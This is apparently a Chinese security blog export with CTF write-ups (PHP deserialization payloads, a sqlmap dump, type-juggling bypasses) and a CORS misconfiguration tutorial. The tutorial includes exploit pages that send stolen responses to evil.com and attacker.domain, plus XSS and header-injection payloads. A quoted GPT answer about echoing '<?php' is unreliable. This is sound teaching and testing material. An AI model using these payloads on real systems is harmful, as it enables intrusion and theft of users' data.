随意选择文件，点击表单提交，使用抓包工具burpsuite抓取请求包 并修改filename值为 |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} 发送请求包，代码执行过程分析： 因此直接执行print_r(scandir(dirname(__FILE__)));并返回 phpinfo`查看当前目录，`/opt/lampp/htdocs/ 构造最终payload读取Here_1s_7he_fl4g_buT_You_Cannot_see.php文件内容，即flag |O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:88:\\\"print_r(file_get_contents(\\\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\"));\\\";} 这里不知道为啥访问不了连接，找到了原靶场也不行… ctfshow web263 session.upload_progress进行文件包含和反序列化渗透 https://www.freebuf.com/vuls/202819.ht 12.7 CVE-2016-7124 漏洞分析 该漏洞存在于PHP5小于5.6.25版本或PHP7小于7.0.10版本中，该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行，demo如下 &lt;html&gt; &lt;head&gt; &lt;title&gt;PHP反序列化demo&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;?php class test{ var $name = \"Jacky\"; function __destruct(){ $file = fopen(\"hello.php\",\"w\"); fputs($file,$this-&gt;name); fclose($file); } function __wakeup() { foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up... \"; } } $test = $_POST['test']; $test_unser = unserialize($test); ?&gt; &lt;/body&gt; &lt;/html&gt; 由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。 如果我们使用如下payload test=O:4:\"test\":1:{s:4:\"name\";s:18:\"&lt;?php phpinfo();?&gt;\";} 会执行__wakeup()函数，页面上会出现如下输出 如果我们使用如下payload test=O:4:\"test\":2:{s:4:\"name\";s:18:\"&lt;?php phpinfo();?&gt;\";} 会执行__wakeup()函数，页面上会出现如下输出 这里发现个有趣的事情,echo 不能打印出PHP标识符&lt;?php,因此要url编码一下 GPT回答: 在PHP中，&lt;?php 是一个标记（tag），用于指示 PHP 代码的起始点。当使用 echo 函数时，它会将其后的内容作为字符串进行输出。但是，如果你尝试使用 echo 输出 &lt;?php，它将被解释为一个 PHP 的起始标记，而不是普通的字符串。 为了在 echo 中输出 &lt;?php 这样的 PHP 标识符，你可以使用转义字符 \\ 来告诉 PHP 解释器不要将其解释为标记，而是作为普通的文本。 1.使用htmlspecialchars函数对字符串进行转义： echo htmlspecialchars('&lt;?php'); 2.将&lt;?php拆分为两部分并连接起来： echo '&lt;?' . 'php'; 防御方法： 1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能 2.在文件系统函数的参数可控时，对参数进行严格的过滤。 3.严格检查上传文件的内容，而不是只检查文件头。 4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。 PHP手册：https://www.php.net/manual/en/book.stream.php","categories":["常见top漏洞"]},{"title":"攻防世界-inget","path":"/2023/07/27/inget/","content":"题目描述： 无 题目解题： 根据题目名称，大概率是一个get型sql注入 尝试手工注入 bp抓包，先尝试如下 ?id=1' and 1=1-- - ?id=1' and 1=2-- - ?id=1' or 1=2-- - 都均无回显 尝试：?id=1' or 1=1-- - 成功回显 尝试sqlmap注入 第一步：sqlmap -u “http://61.147.171.105:55796/?id=1” -dbs 发现如图所示的敏感数据库名cyber 查看cyber表中数据 第二步：sqlmap -u \"http://61.147.171.105:55796/?id=1\" -T cyber --dump 发现flag","categories":["攻防世界"]},{"title":"攻防世界-baby_web","path":"/2023/07/27/baby-web/","content":"题目描述： 想想初始页面是哪个 题目解题： 进入首页发现如图 题目告诉我们想想初始页面在哪，那很明显就是让我们访问index.php，于是我们访问index.php看看，访问之后发现其很快就跳转到1.php，所以我们F12看看网络情况，如下图，打开后继续访问index.php发现如下图，结果是被重定向了 那我们bp抓包看看，访问index.php抓包 成功截取到flag","categories":["攻防世界"]},{"title":"攻防世界-simple_php","path":"/2023/07/27/simple-php/","content":"题目描述： 小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 题目解题： 打开页面后，发现简单的PHP代码，开始审计 &lt;?php show_source(__FILE__); include(\"config.php\"); $a=@$_GET['a']; $b=@$_GET['b']; if($a==0 and $a){ echo $flag1; } if(is_numeric($b)){ exit(); } if($b&gt;1234){ echo $flag2; } ?&gt; 如上代码我们可以发现，如果’a==0‘为true，但a本身不是0，则输出一部分flag，接下来判断b，如果b不是数字，且b大于1234，则输出剩下部分的flag 首先a是一个弱类型比较，而比较有如下情况 var_dump('a' == 0);\t//bool(true) var_dump('1a' == 1);\t//bool(true) var_dump('12a' == 1);\t//bool(false) 1. 字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。 2. 但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。 那很明显我们令a=a即可绕过 针对b利用的是is_numeric函数特性 方法一 利用数组+十六进制来进行绕过，此方法由于is_numeric函数不能处理数组，那么该函数会返回false b[]=58B 方法二 b=1235%20 b=1235%00 方法三 php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过 b=1235a 此函数若是在sql注入中碰到也可以用16进制来绕过，将sql语句转为16进制字符串即可 如下图成功得到flag","categories":["攻防世界"]},{"title":"攻防世界-weak_auth","path":"/2023/07/27/weak-auth/","content":"题目描述： 小宁写了一个登陆验证页面，随手就设了一个密码。 题目解题： 打开页面发现如下图是一个简单的登录页面 我们随便输一组账号密码看看 发现其在弹出一个密码错误的边框后，页面跳到check.php页面，查看源代码发现 这大概率就是要bp爆破了，我们不急，现在登录页面尝试几手 我们此次修改了账户名，发现如上弹框，这说明我们必须以admin身份登录，因此只需要抓包爆破password即可 如图设置好后开始爆破 如图发现明显点，点击看看响应 找到flag","categories":["攻防世界"]},{"title":"攻防世界-disabled_button","path":"/2023/07/27/disabled-button/","content":"题目描述： X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 题目解题： 首先进入题目发现如下页面： 根据已有的题目信息，我们猜测大概率是要想方法成功点击flag按钮即可，结合题目描述，我们要借助前端知识。 首先查看了源代码 我们看到这里在flag按钮处有一个disabled属性，这导致了他的不可点击，接下来先上一手GPT回答 &lt;input disabled class=\"btn btn-default\" style=\"height:50px;width:200px;\" type=\"submit\" value=\"flag\" name=\"auth\" /&gt;： 一个输入元素，type为\"submit\"，表示提交按钮； name为\"auth\"； value为\"flag\"，显示在按钮上的文本； disabled属性设置为\"disabled\"，使按钮不可点击； class为\"btn btn-default\"，这个class来自之前引用的Bootstrap样式表，用于设置按钮的样式； style属性设置了按钮的高度和宽度。 也就是说我们需要想办法去掉disabled这个属性，那么很明显我们直接F12进控制台修改即可 只需将上图的disabled属性去除即可 可以发现按钮亮度变量，即我们可以点击了，不过我再第一次点击的时候仍然没反应，页面直接刷新到初始状态，由此我们尝试bp抓包 如上图成功拿到flag","categories":["攻防世界"]},{"title":"CORS跨域漏洞","path":"/2023/07/26/cors-kua-yu-lou-dong/","content":"CORS跨域漏洞 0x01 漏洞简介 跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享 CORS 漏洞主要是由于程序员配置不当，对于 Origin 源校验不严格，从而造成跨域问题，攻击者可以利用 CORS 错误配置漏洞，从恶意网站跨域读取受害网站的敏感信息。 是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。 同源策略 这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。源由通信协议，域和端口号组成。 ​SOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。 简单来说:同时满足同协议，同域名，同端口这三个条件，就是同源。 浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。 SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。 跨域访问的一些场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 跨域请求方式 CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。 请求方法是以下三种方法之一： - HEAD - GET - POST HTTP的头信息不超出以下几种字段： - `Accept` - `Accept-Language` - `Content-Language` - `Last-Event-ID` - `Content-Type`：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` 简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。 浏览器对简单请求和非简单请求的处理机制不一样。 对于简单请求，浏览器就会立刻发送这个请求。 对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。 0x02 CORS跨域原理及漏洞成因 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。当服务器接收到请求后发现Origin字段指定的域名在许可范围内，服务器会在响应包中增加三个与CORS相关的字段，Access-Control-Allow-Origin、Access-Control-Allow-Credentials、Access-Control-Expose-Headers。其中Access-Control-Allow-Origin字段是必须存在的，它的值可能是Origin字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大。 再回到三个字段上，其中Access-Control-Allow-Credentials字段不是必选字段，它的值是一个布尔值且只能设置为true，表示服务器允许浏览器将cookie包含在请求中，否则就不添加此字段。但需要注意的是，如果要发送cookie，Access-Control-Allow-Origin就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略。而Access-Control-Expose-Headers字段主要是指定想要获取XMLHttpRequest对象中getResponseHeader（）方法的其他服务器字段。 所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。 CORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。 0x03 CORS漏洞攻击流程 1.假设用户登陆一个含有CORS配置网站foo.com，同时又访问了攻击者提供的一个链接evil.com。 2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。 3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。 http://foo.com/index.php代码如下 http://foo.com/phpinfo.php代码如下 在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。 然后构造黑客发生送给用户的恶意页面http://evil.com/steal.html &lt;!DOCTYPE&gt; &lt;html&gt; &lt;h1&gt;CORS test&lt;/h1&gt; &lt;script type=\"text/javascript\"&gt; function loadXMLDoc() { var xhr1; var xhr2; if(window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2= new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange=function() { if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response { var datas=xhr1.responseText; xhr2.open(\"POST\",\"http://evil.com/save.php\",\"true\"); alert('3'); xhr2.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded;charset=utf-8\"); xhr2.send(\"T1=\"+escape(datas)); } } xhr1.open(\"GET\",\"http://foo.com/phpinfo.php\",\"true\") //request user page. alert(xhr1.responseText); xhr1.withCredentials = true; //request with cookie xhr1.send(); } loadXMLDoc(); &lt;/script&gt; &lt;/html&gt; 当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。 接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。evil.com/save.php代码如下： 黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。 但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。 去掉foo.com/phpinfo.php服务端的注释 重新访问http://evil.com/steal.html 发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，随后js脚本把页面编码后发送到evil.com/save.php去 模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。 0x04 修复及防御方式 1.仔细评估是否开启CORS，如果不必要就不要开启CORS 2.如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。 3.仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS 4.要尽可能的返回\"Vary: Origin\"这个头部，以避免攻击者利用浏览器缓存 5.如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。 6.限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。 7.限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。 8.仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。 0x05 简单请求的示例 跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。 例如下面的来自站点 http://example.com 的网页应用想要访问 http://bar.com 的资源： requests 1 GET /resources/public-data/ HTTP/1.1 2 Host: bar.com 3 User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre 4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5 Accept-Language: en-us,en;q=0.5 6 Accept-Encoding: gzip,deflate 7 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 8 Connection: keep-alive 9 Referer: http://example.com/examples/access-control/simpleXSInvocation.html 10 Origin: http://example.com response 11 HTTP/1.1 200 OK 12 Date: Mon, 01 Dec 2020 00:23:53 GMT 13 Server: Apache/2.0.61 14 Access-Control-Allow-Origin: * 15 Keep-Alive: timeout=2, max=100 16 Connection: Keep-Alive 17 Transfer-Encoding: chunked 18 Content-Type: application/xml 第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 http://example.com。 第 11~18 行是来自于 http://bar.com 的服务端响应。响应中携带了响应首部字段 Access-Control-Allow-Origin（第 14 行）。使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。本例中，服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 http://example.com 的访问，该首部字段的内容如下： Access-Control-Allow-Origin: http://example.com 如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段： Access-Control-Allow-Credentials: true 这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie） 0x06 漏洞利用 这里以droabox靶场为例 这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞 接下来我们就可以建立一个恶意的js代码 &lt;!-- cors.html --&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;cors exp&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=\"text/javascript\"&gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; //作用解释如下 } }; xhttp.open(\"GET\", \"http://192.168.0.101/DoraBox/csrf/userinfo.php\"); xhttp.withCredentials = true; xhttp.send(); } cors(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; //document.getElementById(\"demo\").innerHTML = this.responseText; 这段代码的作用是将 this.responseText 的内容设置为具有 id \"demo\" 的元素的内部 HTML。 具体解释如下： document.getElementById(\"demo\") 是一个 DOM 方法，它通过元素的 id 属性获取对应的 HTML 元素。在这个例子中，它获取具有 id \"demo\" 的元素。 .innerHTML 是获取或设置 HTML 元素的内部 HTML 内容的属性。通过将等号右侧的值赋给它，可以更新元素的内部 HTML 内容。 this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返回的响应文本。 因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id \"demo\" 的元素的内部 HTML 内容。这样，在网页中具有 id \"demo\" 的元素会显示服务器返回的文本内容。 访问这个页面就可以获取已登录的用户的信息 该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。 0x07 漏洞发现技巧 在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义， CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。 方式一: BurpSuite 一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。 方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。 在Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org HTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。 组合应是这种： Access-Control-Allow-Origin: foo.example.org Access-Control-Allow-Credentials: true 注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。 Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 当我们进行测试时，看服务器响应头字段里可以关注这几个点： 最好利用的配置： Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Credentials: true 可能存在可利用的配置： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 很好的条件但无法利用： 下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线 Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 单一的情况 方式二: Access-Control-Allow-Origin： curl命令，输入curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I 如果出现这种组合，说明存在CORS漏洞 Access-Control-Allow-Origin: foo.example.org Access-Control-Allow-Credentials: true 方式三: 使用CORScanner工具(漏洞自动化扫描) github上提供了一个关于扫描CORS配置漏洞的脚本 https://github.com/chenjj/CORScanner CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。 总结漏洞的原因： 1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。 2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。 安全隐患 这个流程中。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说。在支持CORS的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。 如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么CORS的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。 0x08 其他可能利用漏洞的地方 8.1 解析Origin头时出错 一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现。收到CORS请求后，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标题中，以便授予访问权限。例如，web应用收到一个正常的请求： GET /data HTTP/1.1 Host: bar.com ... Origin: https://example.com web应用根据其允许的来源列表检查当前请求资源的来源，如果在列表中，则按以下方式反映该来源： HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://example.com 但在检测来源是否存在于白名单时经常可能出现问题，一些网站可能会允许其所有的子域（包括尚未存在未来可能存在的子域）来进行访问，或者允许其他网站的域以及其子域来访问请求。这些请求一般都通过通配符或者正则表达式来完成，但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限。例如： 例如，假设一个应用程序授予对以下列结尾的所有域的访问权限： example.com 攻击者可能可以通过注册域来获得访问权限： exeexample.com 或者，假设应用程序授予对所有以example.com开头的域访问权限，攻击者就可以使用该域获得访问权限： example.com.evil-user.net 8.2 利用相互受CORS信任的域来进行XSS 假如两个互相受信任的源，如果其中一个网站存在XSS，攻击者就可以利用XSS注入一些JavaScript代码，利用这些代码对信任其源的另一个网站进行敏感信息的获取。 如果进行CORS请求时网站响应： HTTP/1.1 200 OK Access-Control-Allow-Origin: https://vulnerable.com Access-Control-Allow-Credentials: true 就可以利用XSS漏洞在vulnerable.com网站上使用下面的URL来通过检索API密钥： https://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt; 8.3 白名单中的null值 CORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在RFC 6564中被定义。RFC 6564规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。 CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求构造的Origin为null值。这将满足白名单的要求，从而导致跨域访问。例如，可以使用iframe以下格式的沙盒跨域请求来完成： &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener(); req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; &lt;/script&gt;\"&gt; &lt;/iframe&gt; 这就意味着任何配置有Access-Control-Allow-Origin: null和Access-Control-Allow-Credentials:true的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。 0x09 利用CORS漏洞(偏实际环境) 流程: 假设用户登陆一个含有CORS配置网站vuln.com，同时又访问了攻击者提供的一个链接evil.com。 evil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。 如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。 方式一：存在用户凭证 详细过程 创建一个JavaScript脚本去发送CORS请求，poc关键代码如下： var req = new XMLHttpRequest(); req.onload = reqListener(); req.open(“get”,”https://vulnerable.domain/api/private-data”,true); req.withCredentials = true; req.send(); function reqListener() { location=”//attacker.domain/log?response=”+this.responseText; }; 2. 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在CORS配置的服务器。 ```http GET /api/private-data HTTP/1.1 Host: vulnerable.domain Origin: https://attacker.domain/ Cookie: JSESSIONID=&lt;redacted&gt; ``` 3. 响应包 ```http HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Access-Control-Allow-Origin: https://attacker.domain Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials Vary: Origin Expires: Thu, 01 Jan 1970 12:00:00 GMT Last-Modified: Wed, 02 May 2018 09:07:07 GMT Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 Pragma: no-cache Content-Type: application/json;charset=ISO-8859-1 Date: Wed, 02 May 2018 09:07:07 GMT Connection: close Content-Length: 149 {\"id\":1234567,\"name\":\"Name\",\"surname\":\"Surname\",\"email\":\"email@target.local\",\"account\":\"ACT1234567\",\"balance\":\"123456,7\",\"token\":\"to p-secret-string\"} ``` 3. 因为服务器发送了右边的“ Access-Control-Allow- *”给客户端，所以，攻击的浏览器允许包含恶意的JavaScript代码的页面访问用户的隐私数据。 #### 方式二：不存在用户凭证 ![image-20230510212310583](CORS跨域漏洞/image-20230510212310583.png) **详细过程** 1. 攻击方式1：绕过基于IP的认证 如果目标应用程序与受害者的网络可达性，并且目标应用程序使用IP地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于IP的身份验证。 2. 攻击方式2：客户端缓存中毒 例如，数据报文头部中包含`X-User`标头，其值未进行任何输入验证，输出编码。 请求包 ```http GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: &lt;svg/onload=alert(1)&gt; ``` 响应包 `Access-Control-Allow-Origin`已被设置，`Access-Control-Allow-Credentials: true`与`Vary: Origin`头适合设置 ```http HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: &lt;svg/onload=alert(1)&gt; ``` 构造存在恶意的XSS有效负载页面，诱使受害者触发。 ```JavaScript var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', '&lt;svg/onload=alert(1)&gt;'); req.send(); function reqListener() { location='http://www.target.local/login'; } ``` 1. 攻击方式3：服务器端缓存中毒 利用CORS的错误配置注入任意HTTP头部，将其保存在服务器端缓存中，可用于构造存储类型XSS。 利用条件：存在服务器端缓存，能够反射`Origin`头部，不会检查`Origin`头部中的特殊字符，如`\\r` 利用方式：攻击IE / Edge用户（IE / Edge使用`\\r`作为的HTTP标题段的终结符） 请求包 ```http GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 ``` 回车（CR）：ASCII码：'\\r' ，十六进制：0x0d 响应包 ```http HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 ``` 如果攻击者能提前发送畸形的`Origin`消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为`UTF-7`，可引发XSS中断。 #### 类型2 1.描述 在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。 